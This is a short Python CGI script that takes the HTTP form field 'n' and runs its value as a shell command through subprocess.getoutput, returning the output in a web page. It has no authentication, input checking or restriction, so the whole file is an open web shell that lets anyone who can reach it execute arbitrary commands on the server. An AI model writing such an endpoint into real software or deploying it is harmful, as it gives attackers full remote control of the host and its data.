#!/usr/bin/python3

import cgi
import subprocess

print("Content-type: text/html")
print()

mydata = cgi.FieldStorage()
data = mydata.getvalue("n")
#myname = data

output = subprocess.getoutput(data)
print("<pre>")
print(output)
print("</pre>")